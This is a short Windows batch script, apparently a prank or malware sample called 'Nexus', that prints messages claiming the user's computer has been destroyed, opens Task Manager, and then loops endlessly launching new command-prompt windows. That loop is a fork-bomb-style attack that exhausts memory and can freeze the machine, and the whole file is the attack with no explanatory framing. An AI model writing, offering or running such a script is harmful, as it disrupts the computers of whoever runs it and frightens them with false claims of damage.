@echo off
echo "Your computer has been destroyed by Nexus, now prepare to lose your ram.
TIMEOUT /T 2 /NOBREAK > nul
echo "I will give you task manager, but you won't be able to see it for long."
TIMEOUT /T 5 /NOBREAK > nul
start taskmgr.exe
TIMEOUT /T 20 /NOBREAK > nul
:loop
start cmd.exe
goto loop
